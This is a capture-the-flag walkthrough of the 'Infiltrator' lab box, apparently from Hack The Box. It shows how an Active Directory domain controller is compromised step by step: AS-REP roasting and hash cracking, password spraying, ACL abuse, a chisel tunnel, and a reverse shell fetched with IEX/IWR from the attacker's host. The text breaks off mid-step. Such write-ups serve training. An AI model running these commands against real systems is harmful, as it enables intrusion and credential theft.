---
description: >-
  Well, what do we have here? You must be a new arrival. Let me guess. Here to
  change the past, right? Well, you're not the first. But there's no salvation
  here. - Drunkard
---

# Infiltrator

This is an insane box with many steps. I'll give many commands and configs, but there are certain things that I assume you know how to do. If you have questions though, feel free to hit me up on Discord justa.guy (No response is guaranteed, I stay busy, not personal).

We start with an nmap of the machine ip. I'm lazy, so i'm just going to run a -A -p- here.

{% code overflow="wrap" fullWidth="true" %}
```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ nmap 10.129.119.60 -p- -A
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 20:24 EDT
Stats: 0:03:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 90.57% done; ETC: 20:28 (0:00:20 remaining)
Nmap scan report for 10.129.119.60
Host is up (0.036s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Infiltrator.htb
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-14 00:28:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-05-14T00:31:24+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2025-05-14T00:31:24+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-14T00:31:24+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-14T00:31:24+00:00; 0s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-05-14T00:31:24+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2025-05-13T00:16:13
|_Not valid after:  2025-11-12T00:16:13
| rdp-ntlm-info: 
|   Target_Name: INFILTRATOR
|   NetBIOS_Domain_Name: INFILTRATOR
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: infiltrator.htb
|   DNS_Computer_Name: dc01.infiltrator.htb
|   DNS_Tree_Name: infiltrator.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-14T00:30:44+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
15220/tcp open  unknown
49667/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49729/tcp open  msrpc         Microsoft Windows RPC
49750/tcp open  msrpc         Microsoft Windows RPC
53728/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-14T00:30:49
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   39.30 ms 10.10.14.1
2   39.46 ms 10.129.119.60
```
{% endcode %}

We immediately gain a lot of information. First, it's interesting that there are so many services available to us, increasing the attack surface beyond just web. We do however, also see a web port, on 80.

An interesting note is that ldap/ssl is in play, and if we throw in an additional nmap script with this information, it might be useful later (credit to gr0s4b1):

```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ sudo nmap 10.129.119.60 -p 389 --script "ssl-cert" 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-13 21:02 EDT
Nmap scan report for 10.129.119.60
Host is up (0.032s latency).

PORT    STATE SERVICE
389/tcp open  ldap
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Issuer: commonName=infiltrator-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-04T18:48:15
| Not valid after:  2099-07-17T18:48:15
| MD5:   edac:cc15:9e17:55f8:349b:2018:9d73:486b
|_SHA-1: abfd:2798:30ac:7b08:de25:677b:654b:b704:7d01:f071
```

We can see that DC01 appears to also be the CA. This should be noticed, but nothing is actionable yet. However, we can go ahead and add infiltrator.htb and dc01.infiltrator.htb to our /etc/hosts file.

Going through the website yields very little, and the attack surface is small. However, you do find 7 employee names in the about section:

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

In total, the names are:

```
David Anderson
Olivia Martinez
Kevin Turner
Amanda Walker
Marcus Harris
Lauren Clark
Ethan Rodriguez
```

Let's use these to make some usernames. I found this cool script online, but there are probably many like it: [https://github.com/florianges/UsernameGenerator](https://github.com/florianges/UsernameGenerator)

After running it, we get a long list of possible usernames:

```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ python3 ./UsernameGenerator.py names.txt possible-names.txt
UsernameGenerator.py - Simple username generator based on a list of name and surname
------------------------------------------------------
Input file: names.txt
Output file: possible-names.txt
------------------------------------------------------
Usernames written to output file possible-names.txt
Number of users created: 364
------------------------------------------------------
```

Let's spray them across the domain, specifically looking for AS-REP roasting pathways. I want to note here, that null sessions and guest accounts should also be enumerated.

We get a ton of output, but notice two things. First, all the "first initial.last name" names return:

```
[-] User d.anderson doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Meaning the usernames are:

```
d.anderson
o.martinez
k.turner
a.walker
m.harris
l.clark
e.rodriguez
```

Second, we get a hash from l.clark:

```
$krb5asrep$23$l.clark@INFILTRATOR.HTB:baab4588fbfff5f7603aa9c86e23b798$d05f713c3e9f1d1f27e1f86a2aff9cb96a0d848aa99dfe1a7e1e4f35949799c13ad40377ae14ae9f7202d57e396addb4af254ac41231f38042c0ed2a88d26e3381fe5f81ed89ed8134e08c54e27ac83956a210c914cdb384c972fd52fdeb6a08d725d47049ed0d09df89da55d89373713a7a0d711db4845c08ab4cfaa5ac665f5f10f525aa458a0a3fed9c5fccd132ea0da6153dad786c2043535e149e3dc646231e331026b43c0ab9688ff819032bef8dcd21afe42d53998b1f877979b0aead322eb358d33aa9a0f201daf2735c07a1ca1c0543e70e6ad66a26a4d750464153126910607716211bb2d11dfe8a2fef028a24
```

Great, now we know 7 usernames, and a hash. Let's try to crack that hash and see what happens. Fortunately, we already have the hash formatted and ready to go for hashcat, since we used that flag in our command. Let's just copy and paste that hash into a file and run it:

```
echo '$krb5asrep$23$l.clark@INFILTRATOR.HTB:f48aa93a745f87fe2915de6d7a5297cb$3c67dfbd0a71880460ae794f18a7ca0e3c301a796ede8ab9a24112ea618f5e0ab98605c40a0256039b359ee3429b6d32ac9b45d5fa2a86a9da79f2f40d20bfd18f9bd9fbc6f7a6caae2e48a42db975daff1d96b3adaab18c3115b1659e1ab2f454ca60cb6c1977ac16521cba4e35e0ed045d9f0d1a65eeb3ba8d63563a30e2fe44073405bb0b23389b5159f9591268865898869cfc8ff6047e5f560f1b5c1195cd8f8ebddda967eb122e2081c99d61fa57d3540b558f111d83bc342d6abb91738ddb6111ef1396bc5bd630a2196b968783340e2c3de30ff49989c29df4d8b4b77289c88a124de4e121a836fccfdfe67fa46b' > l.clark.hash && hashcat ./l.clark.hash /usr/share/wordlists/rockyou.txt
```

New hashcats will auto detect the hash, but for people who would really wish I had just said the mode number here, I'm sorry. You will have to find out that it's mode 18200 on your own.

{% code overflow="wrap" %}
```
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$l.clark@INFILTRATOR.HTB:f48aa93a745f8...7fa46b
Time.Started.....: Tue May 13 21:24:17 2025 (6 secs)
Time.Estimated...: Tue May 13 21:24:23 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1882.4 kH/s (0.73ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10504192/14344385 (73.23%)
Rejected.........: 0/10504192 (0.00%)
Restore.Point....: 10502144/14344385 (73.21%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: WEREVER -> WASSUP85
Hardware.Mon.#1..: Util: 76%

Started: Tue May 13 21:23:53 2025
Stopped: Tue May 13 21:24:23 2025
                                                                                                                                                                                                               
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ echo '$krb5asrep$23$l.clark@INFILTRATOR.HTB:f48aa93a745f87fe2915de6d7a5297cb$3c67dfbd0a71880460ae794f18a7ca0e3c301a796ede8ab9a24112ea618f5e0ab98605c40a0256039b359ee3429b6d32ac9b45d5fa2a86a9da79f2f40d20bfd18f9bd9fbc6f7a6caae2e48a42db975daff1d96b3adaab18c3115b1659e1ab2f454ca60cb6c1977ac16521cba4e35e0ed045d9f0d1a65eeb3ba8d63563a30e2fe44073405bb0b23389b5159f9591268865898869cfc8ff6047e5f560f1b5c1195cd8f8ebddda967eb122e2081c99d61fa57d3540b558f111d83bc342d6abb91738ddb6111ef1396bc5bd630a2196b968783340e2c3de30ff49989c29df4d8b4b77289c88a124de4e121a836fccfdfe67fa46b' > l.clark.hash && hashcat ./l.clark.hash /usr/share/wordlists/rockyou.txt --show
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5asrep$23$l.clark@INFILTRATOR.HTB:f48aa93a745f87fe2915de6d7a5297cb$3c67dfbd0a71880460ae794f18a7ca0e3c301a796ede8ab9a24112ea618f5e0ab98605c40a0256039b359ee3429b6d32ac9b45d5fa2a86a9da79f2f40d20bfd18f9bd9fbc6f7a6caae2e48a42db975daff1d96b3adaab18c3115b1659e1ab2f454ca60cb6c1977ac16521cba4e35e0ed045d9f0d1a65eeb3ba8d63563a30e2fe44073405bb0b23389b5159f9591268865898869cfc8ff6047e5f560f1b5c1195cd8f8ebddda967eb122e2081c99d61fa57d3540b558f111d83bc342d6abb91738ddb6111ef1396bc5bd630a2196b968783340e2c3de30ff49989c29df4d8b4b77289c88a124de4e121a836fccfdfe67fa46b:WAT?watismypass!
```
{% endcode %}

Wow, thats great to see. Let's try those credentials out with SMB:

{% code overflow="wrap" %}
```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ nxc smb dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!' --shares
SMB         10.129.119.60   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.119.60   445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.129.119.60   445    DC01             [*] Enumerated shares
SMB         10.129.119.60   445    DC01             Share           Permissions     Remark
SMB         10.129.119.60   445    DC01             -----           -----------     ------
SMB         10.129.119.60   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.119.60   445    DC01             C$                              Default share
SMB         10.129.119.60   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.119.60   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.119.60   445    DC01             SYSVOL          READ            Logon server share 
```
{% endcode %}

As expected, he does not have much access. But he can still query ldap, so let's go ahead and dump some bloodhound data:

```
┌──(kali㉿kali)-[~/infiltrator-writeup]
└─$ bloodhound-python -d infiltrator.htb -u l.clark -p 'WAT?watismypass!' -dc dc01.infiltrator.htb -c all --zip -ns 10.129.119.60 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: infiltrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 14 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.infiltrator.htb
INFO: Done in 00M 07S
INFO: Compressing output into 20250513213011_bloodhound.zip
```

Unfortunately, this user does not seem to increase our access:

<figure><img src=".gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

He has no real outbound controls. We need to enumerate further. Let's switch gears a little, and get more nitty gritty with an AWESOME application called "godap" [https://github.com/Macmod/godap](https://github.com/Macmod/godap)

```
godap dc01.infiltrator.htb -u l.clark -p 'WAT?watismypass!' -d infiltrator.htb
```

<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Here, you can easily navigate and view ldap information.

As we enumerate the K.turner user, we find what appears to be a password in their description field:

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

I'll skip some searching for you and just say that this password is not usable yet. Let's keep going.

One thing you find is that two users are members of a particular interesting group, "Protected Users":

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

This group is important to take note of, because users in this group must authenticate with kerberos. Something which you should have already done is attempted credential re-use by spraying the one credential we found across all users in the domain. However, this would have turned up nothing. Armed with the knowledge that there are two users in the protected users group, we should shift our tactics regarding those users.

Let's add a -k flag to the end of our nxc password spray, and see what happens:

```
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ nxc ldap dc01.infiltrator.htb -u ../../usernames.txt -p 'WAT?watismypass!' -k --continue-on-success
SMB         dc01.infiltrator.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAP        dc01.infiltrator.htb 389    DC01             [-] infiltrator.htb\o.martinez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED
LDAP        dc01.infiltrator.htb 389    DC01             [-] infiltrator.htb\k.turner:WAT?watismypass! KDC_ERR_PREAUTH_FAILED
LDAP        dc01.infiltrator.htb 389    DC01             [-] infiltrator.htb\a.walker:WAT?watismypass! KDC_ERR_PREAUTH_FAILED
LDAP        dc01.infiltrator.htb 389    DC01             [-] infiltrator.htb\m.harris:WAT?watismypass! KDC_ERR_PREAUTH_FAILED
LDAP        dc01.infiltrator.htb 389    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
LDAP        dc01.infiltrator.htb 389    DC01             [-] infiltrator.htb\e.rodriguez:WAT?watismypass! KDC_ERR_PREAUTH_FAILED
LDAP        dc01.infiltrator.htb 389    DC01             [+] infiltrator.htb\d.anderson:WAT?watismypass!
```

Wow! We do indeed have a hit. d.anderson shares a password with l.clark. Lets go check out what his permissions are with bloodhound:

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

Whoa! We got ourselves a whole little attack chain. d.anderson -> generic all OU -> contains e.rodriguez -> addself to chiefs -> force change password on m.harris

I want to take a second here and make a note. There is a script that runs on this domain that will automatically reset users values back to normal after a given period of time. This means we have to perform our attacks quickly, and then print a ticket for m.harris, which will persist. Let's get our commands queued up. By clicking on each little exploit path in Bloodhound, it will actually tell you a command you can use. However, we will go off script a little here, and us BloodyAD [https://github.com/CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

{% code overflow="wrap" %}
```
impacket-getTGT infiltrator.htb/d.anderson:'WAT?watismypass!' -dc-ip dc01.infiltrator.htb

export KRB5CCNAME=d.anderson.ccache

impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb'/'d.anderson':'WAT?watismypass!' -k -no-pass -dc-ip dc01.infiltrator.htb

bloodyAD --host "dc01.infiltrator.htb" --dc-ip 10.129.171.160 -u 'd.anderson' -p 'WAT?watismypass!' -d "infiltrator.htb" -k set password "e.rodriguez" 'WAT?watismypass!'

impacket-getTGT infiltrator.htb/e.rodriguez:'WAT?watismypass!' -dc-ip dc01.infiltrator.htb

export KRB5CCNAME=e.rodriguez.ccache

bloodyAD --host "dc01.infiltrator.htb" --dc-ip 10.129.171.160 -u 'e.rodriguez' -p 'WAT?watismypass!' -d "infiltrator.htb" -k add groupMember "Chiefs Marketing" e.rodriguez

bloodyAD --host "dc01.infiltrator.htb" --dc-ip 10.129.171.160 -u 'e.rodriguez' -p 'WAT?watismypass!' -d "infiltrator.htb" -k set password "m.harris" 'WAT?watismypass!'

impacket-getTGT infiltrator.htb/m.harris:'WAT?watismypass!' -dc-ip dc01.infiltrator.htb

export KRB5CCNAME=m.harris.ccache
```
{% endcode %}

After all that, we now have a ticket for m.harris:

```
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ klist   
Ticket cache: FILE:m.harris.ccache
Default principal: m.harris@INFILTRATOR.HTB

Valid starting       Expires              Service principal
05/13/2025 22:13:55  05/14/2025 02:13:55  krbtgt/INFILTRATOR.HTB@INFILTRATOR.HTB
        renew until 05/14/2025 02:13:55
```

Sweet! m.harris is a member of two groups, developers and remote management. This gives us a good idea of their capabilities. We should certainly check rdp and winrm. Since we will be using evil-winrm with kerberos, we want to setup our realm. we can do this with the following little script: [https://gist.github.com/zhsh9/f1ba951ec1eb3de401707bbbec407b98](https://gist.github.com/zhsh9/f1ba951ec1eb3de401707bbbec407b98)

If you have issues, manually check your config file for obvious errors, like "dc01.infiltrator.htb.htb" or something similar. Now lets run nxc against winrm and see what we find:

{% code overflow="wrap" %}
```
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ nxc winrm 10.129.119.60 -u m.harris -k -d infiltrator.htb --use-kcache --dns-server dc01.infiltrator.htb
WINRM       10.129.119.60   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
                                                                                                                                                                                                               
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ nxc rdp 10.129.119.60 -u m.harris -k -d infiltrator.htb --use-kcache --dns-server dc01.infiltrator.htb
RDP         10.129.119.60   3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.129.119.60   3389   DC01             [-] infiltrator.htb\m.harris from ccache 
                                                                                                                                                                                                               
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ nxc winrm 10.129.119.60 -u m.harris -k -d infiltrator.htb --kdcHost dc01.infiltrator.htb --use-kcache --dns-server dc01.infiltrator.htb
WINRM       10.129.119.60   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
```
{% endcode %}

I could not get a response on winrm for some reason, but rdp came back negative. Let's try using winrm manually and see what happens:

{% code overflow="wrap" %}
```
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ evil-winrm -i dc01.infiltrator.htb -u 'm.harris' -r infiltrator.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: User is not needed for Kerberos auth. Ticket will be used
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\M.harris\Documents> 
```
{% endcode %}

We do manage to get a session! Great, we are finally on the box! Note, that the user.txt flag is on the users desktop. We still have a long journey ahead for the root flag though.

Enumerating the programs shows a program called "Output Messenger". Everything else looks not very interesting. We also have that password, if you remember, "MessengerApp@Pass!" from the user "k.turner". This is probably a credential for it.

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

Let's see how we get to it. A quick look at online docs will show us what ports we need access to:

<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

So we will need to establish a proxy chain setup for this, since we didn't see those ports listening from the outside. For this, we will use chisel. Go ahead and upload the Windows version of chisel on the victim DC01, and the Linux version on your host. Next, we can connect the two as server and client:

{% code overflow="wrap" %}
```
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ ./chisel server --port 9050 --socks5 --reverse 
2025/05/14 09:25:08 server: Reverse tunnelling enabled
2025/05/14 09:25:08 server: Fingerprint dlyyg/gBMV/Gcx/LM/HBR3qQCWt5/eqkJtD/XuNnWrs=
2025/05/14 09:25:08 server: Listening on http://0.0.0.0:9050 

--------------------------------------------------------------------------------------

Info: Upload successful!
*Evil-WinRM* PS C:\Users\M.harris\Documents> .\chisel.exe client 10.10.14.55:9050 R:socks
chisel.exe : 2025/05/14 06:26:35 client: Connecting to ws://10.10.14.55:9050
    + CategoryInfo          : NotSpecified: (2025/05/14 06:2...0.10.14.55:9050:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```
{% endcode %}

Also make sure your /etc/proxychains4.conf file are updated correctly:

```
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ tail /etc/proxychains4.conf 
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5  127.0.0.1 1080
```

After a moment, evil-winrm starts throwing a ton of errors, and appears to crash. I believe this is due to the kerberos authentication modules, perhaps they are unstable. Let's switch over to something more stable: [https://github.com/antonioCoco/ConPtyShell](https://github.com/antonioCoco/ConPtyShell)

In one terminal window, run the command:

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Then, download the Invoke-ConPtyShell.ps1 file and host it on a web port:

```
python3 -m http.server 80
```

Finally, in our unstable evil-winrm session, go ahead and pull/execute it:

{% code overflow="wrap" %}
```
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\M.harris\Documents> IEX(IWR http://10.10.14.55/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.55 3001
```
{% endcode %}

Great, we now have a stable shell, and fully interactable. It's like we're sitting right there in front of a native powershell window. We can close down that other evil-winrm session, it won't kill your shell.

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

Now, lets do the same as before, and get our proxychains setup:

```
┌──(kali㉿kali)-[~/infiltrator-writeup/kerbrute/dist]
└─$ ./chisel server --port 9050 --socks5 --reverse
2025/05/14 09:29:40 server: Reverse tunnelling enabled
2025/05/14 09:29:40 server: Fingerprint ojy9FrXSl5IUfXgZdKSg0Mdyp8fcFWDqqOlC4r0EoKI=
2025/05/14 09:29:40 server: Listening on http://0.0.0.0:9050
2025/05/14 09:41:38 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
--------------------------------------------------------------------------------------
PS C:\Users\M.harris\Documents> .\chisel.exe client 10.10.14.55:9050 R:socks
2025/05/14 06:41:38 client: Connecting to ws://10.10.14.55:9050 
2025/05/14 06:41:38 client: Connected (Latency 31.0917ms)
```

After setting the proxy settings for our browser, for example with Burp, we can navigate to the login page of the Output Messenger application:

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

Let's try logging in with those creds we gained from the user description when enumerating ldap (k.turner:MessengerApp@Pass!):

<figure><img src=".gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

It works, and we have two chat rooms available to us, "Dev\_Chat" and "General\_chat". General chat states that we should use the Windows client version of the application. We may seem more information if we switch, and we will do that soon.

The dev chat speaks about some kind of application they created that interacts with ldap, and about a default option, but we need more information (and the app itself). They also speak about an AES decryption function for the password. This means we wil probably get our hands on the binary at some point, and it will contain an AES encrypted password, along with a decryption key.

<figure><img src=".gitbook/assets/image (2) (2).png" alt=""><figcaption></figcaption></figure>

There is not much more here. Let's switch over to the windows client. For this, we will need to proxy traffic, like so: DC01 <-Proxychains-> Kali <-> Windows. This is actually not too hard, and we can use socat to forward the necessary ports on all interfaces towards the proxychains service. Here is how:

```
for p in {14121..14127}; do
  proxychains socat \
    TCP-LISTEN:$p,bind=0.0.0.0,reuseaddr,fork \
    TCP:dc01.infiltrator.htb:$p &
done
```

Now lets dust off that windows machine and install the Output Messenger client. After installation, we should be able to just use the same creds, and put in our local Kali ip (not tun0) as the target server:

<figure><img src=".gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

We are indeed in, and we have more information to look at. We now have a tab for a thing called the "Output Wall", where it looks like the team posts updates. On it, we can see that k.turner has posted a screenshot of the "UserExplorer" custom application working, along with some new credentials:

<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

We already have access to m.harris on the dc01 side, so let's try logging into the messenger application with these credentials.

<figure><img src=".gitbook/assets/image (5) (2).png" alt=""><figcaption></figcaption></figure>

It does work, and we have a conversation with the Admin user about the application, along with a download link for the binary. Lets go ahead and pull it down, and push it over to our Kali for reverse engineering. For this, I will personally be using Ghidra.

Before moving onto Ghidra, there is one more note I want to make. you can see on the sidebar that the user O.martinez is either active, or recently active. So is the Admin account.

<figure><img src=".gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

After expanding all data, and searching through it a little bit, we find the section of importance. It contains references to "winrm\_svc", "-default", an ldap path, a hash, and a base64 encoded string. When laying it out like this, it's obvious that the hash is the AES encryption key, and the base64 is the encrypted password for the user winrm\_svc.

<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Let's tap out the base64 and the hash and go try to decrypt it. For simplicity, I found and used this site: [https://anycript.com/crypto](https://anycript.com/crypto)

<figure><img src=".gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

The output looks like it's still encrypted. I've run into challenges before like this, where the output is encrypted multiple times, somtimes with different algorithms. Let's try just throwing the output back into the input and see what we get:

<figure><img src=".gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

We get the password "WinRm@$svc^!^P". Let's not waste any time, and keep pulling on the output messenger thread, by logging in as winrm\_svc in output messenger. This is successful, and after doing so, we see some important bits of info:

<figure><img src=".gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (10) (2).png" alt=""><figcaption></figcaption></figure>

In the notes section, we found an API key. In the messages with o.martinez, we find that they shared their password with a particular group. Putting these two pieces together, we will probably have to use the API to enumerate that group message chat.

From the offical API documentation, we can see the format of the API request:

<figure><img src=".gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

After some manual checking by installing the output messenger server myself, i could see that the "a\_" prefix in the chat room key can be omitted, and that the "@conferance.com" is standard. Also, you will notice that the key is actually just a timestamp.

Now, you could do what I did the first time around, and brute force all timestamps for the 3 days that the lab was setup (in February 2024). This takes about 30 minutes using ZAP. However, I later found a more elegant solution.

Using the same credentials as the output messenger client, you can winrm into DC01 as winrm\_svc. You can then navigate to the appdata folder for output messenger, where you will find an OM.db3 file.

<figure><img src=".gitbook/assets/image (12) (2).png" alt=""><figcaption></figcaption></figure>

You can then download and open this db3 file in SQLite browser, where you will find the chatroom key:

<figure><img src=".gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

You can see that the key is "c". Lets go ahead and craft an API request in Burp Suite for this.

We can see an example of where to put the API key in the request from the docs (noting that the port is 14125, instead of 14123):

<figure><img src=".gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Combining this with the other example of the endpoint, we come up with this:

```
